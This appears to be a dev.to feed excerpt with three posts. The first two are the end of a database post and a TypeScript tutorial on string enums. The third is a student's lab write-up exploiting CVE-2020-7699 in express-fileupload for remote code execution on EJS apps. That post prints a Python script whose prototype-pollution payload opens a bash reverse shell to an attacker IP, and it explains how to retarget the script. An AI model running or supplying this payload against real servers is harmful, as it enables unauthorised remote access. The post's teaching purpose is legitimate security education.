&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dFtDvlRY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1hq89725af4rfzp9take.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dFtDvlRY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1hq89725af4rfzp9take.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6) Weak Relationship:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_NsllalX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mk2nitsakbcid597z6rz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_NsllalX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mk2nitsakbcid597z6rz.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That's all for today.&lt;br&gt;
Thank You.&lt;br&gt;
Hope to see you in my next article...&lt;/p&gt;

</description>
      <category>database</category>
      <category>computerscience</category>
    </item>
    <item>
      <title>Typescript: String Enums, the easy way</title>
      <author>Navneet Karnani</author>
      <pubDate>Sat, 05 Jun 2021 11:30:48 +0000</pubDate>
      <link>https://dev.to/mandraketech/typescript-string-enums-the-easy-way-1ke4</link>
      <guid>https://dev.to/mandraketech/typescript-string-enums-the-easy-way-1ke4</guid>
      <description>&lt;p&gt;The most common use cases for an enum are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Keys and associated non-string values &lt;/li&gt;
&lt;li&gt;Keys, and string values that match the keys&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, don't read this wrong. I just don't want to replicate everything that is written in the Typescript Handbook ( &lt;a href="https://www.typescriptlang.org/docs/handbook/enums.html"&gt;https://www.typescriptlang.org/docs/handbook/enums.html&lt;/a&gt; )&lt;/p&gt;

&lt;p&gt;The first one is adequately handled in Typescript. Just by using:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;enum MyEnum {
  first,
  second,
  third
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;But the second case looks more like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;enum MyStringEnum {
  first = 'first',
  second = 'second',
  third = 'third'
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As the number of values  increase, it starts getting difficult to manage. And I see lot of boilerplate here. Also, there is scope for mistakes. For example, it is possible to get into this situation:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;enum MyStringEnum {
  first = 'fifth',
  second = 'second',
  third = 'third'
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the Handbook, look at all the complexity required to do a reverse lookup from the Enums.&lt;/p&gt;

&lt;p&gt;Here is my proposal, to build a simple structure that you can implement quickly.&lt;/p&gt;

&lt;p&gt;Lets start with defining the values we want to be the "keys" in the enum:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;const VALID_ENUM_VALUES = ['first', 'second', 'third'] as const;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Notice the &lt;code&gt;as const&lt;/code&gt; at the end of the statement. This is what will make the difference.&lt;/p&gt;

&lt;p&gt;Lets define the type that we can use in the code, to ensure we are not using any invalid values:&lt;br&gt;
&lt;code&gt;type MyEnum = typeof VALID_ENUM_VALUES[number];&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you type this in VSCode, and hover your mouse over &lt;code&gt;MyEnum&lt;/code&gt;, you should see that this is the equivalent of defining:&lt;br&gt;
&lt;code&gt;type MyEnum = 'first' | 'second' | 'third';&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;[number]&lt;/code&gt; tells Typescript to get all the "number based subscripts" of the array.&lt;/p&gt;

&lt;p&gt;The additional advantage, is, if you make changes to the &lt;code&gt;VALID_ENUM_VALUES&lt;/code&gt; array, the &lt;code&gt;MyEnum&lt;/code&gt; changes with it. &lt;/p&gt;

&lt;p&gt;So, if you were to type the following code in the editor:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;console.log("Valid values of the enum are:", VALID_ENUM_VALUES);
const valueToCheck = 'first';
console.log(`Check if '${valueToCheck}' is part of the enum`, VALID_ENUM_VALUES.includes(valueToCheck))

// Error here, because "hello" is not a value in the VALID_ENUM_VALUES array.
const typedVar: MyEnum = 'hello';
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Reverse lookups are not necessary. But, you do want a way to check if a given value is  valid in the context of this Enum. For that, lets write a type asserter:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function isValid(param: unknown): asserts param is MyEnum {
    assert( param &amp;amp;&amp;amp; typeof param === 'string' &amp;amp;&amp;amp; VALID_ENUM_VALUES.includes(param as MyEnum));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now, in this context:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const myStr = 'first';
if ( isValid(myStr)) {
  // here, if 'myStr' is implicitly of type 'MyEnum'
  console.log(`${myStr} is a valid Enum value`);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Another use of this construct, is in defining Objects with keys. Take a look:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyRecordType = Record&amp;lt;MyEnum, unknown&amp;gt;;

// the 'myValue' below will error, because '{}' is not a valid value
const myValue: MyRecordType = {};

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here, the type definition is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyRecordType = {
  first: unknown;
  second: unknown;
  third: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You may change the 'unknown' to any relevant type. So, this gives you a quick way of defining objects with a given structure, and defined types. Obviously, more complex cases are better handled manually.&lt;/p&gt;

&lt;p&gt;Here is another variation of the same:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyPartialRecordType = Partial&amp;lt;MyRecordType&amp;gt;;
// no error here
const myPartialValue: MyPartialRecordType = {};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MyPartialRecordType = {
  first?: unknown;
  second?: unknown;
  third?: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you want to use these in combination, try this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const MUST_HAVE_PARAMS = ['one', 'two'] as const;
type MandatoryParams = typeof MUST_HAVE_PARAMS[number];
const OPTIONAL_PARAMS = ['three', 'four'] as const;
type OptionalParams = typeof OPTIONAL_PARAMS[number];
type MixedRecord = Record&amp;lt;MandatoryParams, unknown&amp;gt; &amp;amp; Partial&amp;lt;Record&amp;lt;OptionalParams, unknown&amp;gt;&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MixedRecord = {
    one: unknown;
    two: unknown; 
} &amp;amp; {
    three?: unknown;
    four?: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;or, to simplify it further:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type MixedRecord = {
    one: unknown;
    two: unknown; 
    three?: unknown;
    four?: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;So, you can now create a Union type, Record type, and also have a array to validate the values against.&lt;/p&gt;

&lt;p&gt;Another interesting example, involving Mapped Types:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const KNOWN_PARAMS_TYPES = ['id', 'name'] as const;
type KnownParams = typeof KNOWN_PARAMS_TYPES[number];

const UNKNOWN_PARAMS_TYPES = ['contentsOfWallet'] as const;
type UnknownParams = typeof UNKNOWN_PARAMS_TYPES[number];

type AllParams = KnownParams | UnknownParams;

type ValueType&amp;lt;T extends AllParams&amp;gt; = T extends KnownParams ? string : unknown;
type ParamType = {
    [Property in AllParams]: ValueType&amp;lt;Property&amp;gt;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the equivalent of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;type ParamType = {
    id: string;
    name: string;
    contentsOfWallet: unknown;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This may look like a lot of magic for something that can be defined in less space, but look at what is available:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Arrays of valid field names, that can be used for input validation, for example when you are dealing with http query strings and want to check if the parameter name is valid&lt;/li&gt;
&lt;li&gt;String union types for use within the application code, for those places where you would have otherwise used &lt;code&gt;key of ParamType&lt;/code&gt; as the type&lt;/li&gt;
&lt;li&gt;A structure that will update itself, as you add more parameters to the known / unknown parts.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In summary, for cases where you want an array of values to use in various places in the application, and still want type safe data structures, this kind of organisation will go a long way in making your code extensible, using the power of Typescript.&lt;/p&gt;

&lt;p&gt;This blog was originally published by Navneet Karnani ( &lt;a href="mailto:navneet@mandraketech.in"&gt;navneet@mandraketech.in&lt;/a&gt; ) on his blog at: &lt;a href="https://blog.mandraketech.in/typescript-string-enums"&gt;https://blog.mandraketech.in/typescript-string-enums&lt;/a&gt;&lt;/p&gt;

</description>
      <category>typescript</category>
      <category>javascript</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>Simple Remote Code Execution on EJS Web Applications with express-fileupload</title>
      <author>boiledsteak</author>
      <pubDate>Sat, 05 Jun 2021 11:18:36 +0000</pubDate>
      <link>https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</link>
      <guid>https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325</guid>
      <description>&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9MXFn2Uy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/overview-diagram.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9MXFn2Uy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/overview-diagram.png" alt="attack scenario diagram"&gt;&lt;/a&gt;&lt;br&gt;
&lt;a href="https://github.com/boiledsteak/EJS-Exploit/blob/main/EJS-RCE-user-guide-plain.docx"&gt;TLDR with no explaination&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As an IT / cybersecurity student, I heavily relied on searching online for guides and forums to help me with my assignments. So this is me giving back to the community 😄&lt;/p&gt;

&lt;p&gt;In this post I will explain how to exploit a vulnerability in an older version of a NodeJS library to enable RCE. Many concepts and technologies used will require an&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;intermmediate level of hands-on knowledge of cybersecurity&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I will not explain every term. The entire process is quite simple. If you are unfamiliar with anything, try read it up. Everything mentioned is fairly common.&lt;/p&gt;

&lt;p&gt;This Proof of Concept (POC) is a simple example of RCE. &lt;strong&gt;Good for demonstrating RCE to an audience without technical knowledge.&lt;/strong&gt; I doubt it can be used in the wild for penetration testing or for any malicious purposes. In fact the author of the dependency has a &lt;a href="https://github.com/richardgirges/express-fileupload"&gt;glaring warning&lt;/a&gt; of this vulnerability at the top of their github repo&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yXZ4G6TC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/github.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--yXZ4G6TC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/github.png" alt="security warning of express-fileupload"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This exploit was referenced from: &lt;a href="https://blog.p6.is/Real-World-JS-1/"&gt;https://blog.p6.is/Real-World-JS-1/&lt;/a&gt;&lt;br&gt;
^The author explains why the outdated dependency is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Disclaimer: I am a security student with no professional programming / software engineer experience so my code may not be following best practices...but they work&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#contents"&gt;
  &lt;/a&gt;
  Contents &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Abstract"&gt;Abstract&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="#Set%20Up"&gt;Set Up&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Attacker"&gt;Attacker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#Victim"&gt;Victim&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#Launch%20Attack"&gt;Launch Attack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href="#Risk"&gt;Risk&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Likelihood"&gt;Likelihood&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#Impact"&gt;Impact&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;
  &lt;a href="#abstract"&gt;
  &lt;/a&gt;
  Abstract &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CVE Code&lt;/td&gt;
&lt;td&gt;CVE-2020-7699&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CWE Code&lt;/td&gt;
&lt;td&gt;CWE-400&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Publish Date&lt;/td&gt;
&lt;td&gt;30 July 2020&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Attack Type&lt;/td&gt;
&lt;td&gt;Remote Code Execution&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vulnerability&lt;/td&gt;
&lt;td&gt;JavaScript Prototype Pollution&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Cause&lt;/td&gt;
&lt;td&gt;Misconfiguration?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Fix&lt;/td&gt;
&lt;td&gt;Update Libraries, Proper Network Configuration, Firewalls&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Affected Technology&lt;/td&gt;
&lt;td&gt;Node, Express, express-fileupload v1.1.10 and earlier , EJS&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;
  &lt;a href="#set-up"&gt;
  &lt;/a&gt;
  Set Up &lt;a&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;p&gt;All files needed can be found in my github repository. Higher resolution version of all images used can be found in there too.&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/boiledsteak"&gt;
        boiledsteak
      &lt;/a&gt; / &lt;a href="https://github.com/boiledsteak/EJS-Exploit"&gt;
        EJS-Exploit
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Remote Code Execution EJS Web Applications using express-fileupload
    &lt;/h3&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;h2&gt;
  &lt;a href="#attacker"&gt;
  &lt;/a&gt;
  Attacker &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;First, set up a Kali Virtual Machine (VM). Ensure all commands are run in bash. Check that Python3 is installed.&lt;/p&gt;

&lt;p&gt;Move this file into the kali VM&lt;br&gt;
&lt;strong&gt;EJS-RCE-attack.py&lt;/strong&gt; (can be found in my github repo)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;##############################################################
# Run this .py to perform EJS-RCE attack
# referenced from
# https://blog.p6.is/Real-World-JS-1/
# 
# Timothy, 10 November 2020
##############################################################
&lt;/span&gt;
&lt;span class="c1"&gt;### imports
&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="c1"&gt;### commands to run on victim machine
&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'bash -c "bash -i &amp;amp;&amp;gt; /dev/tcp/192.168.98.11/8020 0&amp;gt;&amp;amp;1"'&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Starting Attack..."&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;### pollute
&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'http://192.168.98.10:8080'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;'__proto__.outputFunctionName'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s"&gt;"x;console.log(1);process.mainModule.require('child_process').exec('&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;');x"&lt;/span&gt;&lt;span class="p"&gt;)})&lt;/span&gt;

&lt;span class="c1"&gt;### execute command
&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'http://192.168.98.10:8080'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Finished!"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Yes I know a docker would have been lighter than a VM but the purpose of this POC is more for demonstration so having a VM makes the process more visual.&lt;/p&gt;

&lt;p&gt;Next, modify &lt;strong&gt;EJS-RCE-attack.py&lt;/strong&gt; to fit attacker’s machine address and port. Line 13, change&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/dev/tcp/192.168.98.11/8020
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;to&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;/dev/tcp/&amp;lt;attacker’s IP address&amp;gt;/&amp;lt;attacker’s port to listen for connection from victim&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You could leave it at port 8020. Just ensure that no firewall rules are blocking the ports you use.&lt;/p&gt;

&lt;p&gt;Modify &lt;strong&gt;EJS-RCE-attack.py&lt;/strong&gt; to fit victim’s machine address and port. Line 17 and line 21. Change http address to victim’s web address.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JZCFVStV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/changing-address.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JZCFVStV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/changing-address.png" alt="screenshot of code"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="#contents"&gt;🚀 back to contents&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#victim"&gt;
  &lt;/a&gt;
  Victim &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;This part requires a bit more preparation since you will need to set up an EJS web server. There's many detailed guides online about EJS and how to create a web app with it so I won't detail everything in this post. I'll briefly list the steps needed to get one running.&lt;/p&gt;

&lt;p&gt;First, set up an Ubuntu VM. Ensure it can 'talk' to the Kali VM. Install NodeJS and NPM.&lt;/p&gt;

&lt;p&gt;Create a directory to contain the webserver code. It should look something like the screenshot below. For now just create the folders. Don't create the files yet. This step is optional but I feel it makes the webserver cleaner and easier to navigate. This step is useful if you choose to expand on my attack scenario for instance, adding a database to the webserver, adding multiple web pages etc...&lt;/p&gt;

&lt;p&gt;btw command to print directory tree in windows is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;tree /A
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jGPojmKV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/webserver-tree.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jGPojmKV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/webserver-tree.png" alt="screenshot of directory tree"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Okay first file to create is &lt;strong&gt;package.json&lt;/strong&gt;. Move it to backend as pictured in the directory tree screenshot. (all files can be found in my github repo)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight json"&gt;&lt;code&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"name"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"some-website"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"version"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"1.0.0"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"description"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"main"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"server.js"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"scripts"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"start"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"node server.js"&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"author"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;""&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"license"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"ISC"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="nl"&gt;"dependencies"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"ejs"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"^3.1.5"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"express"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"^4.17.1"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="nl"&gt;"express-fileupload"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;"^1.1.7-alpha.3"&lt;/span&gt;&lt;span class="w"&gt;
  &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;open a terminal in the backend folder and run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npm &lt;span class="nb"&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

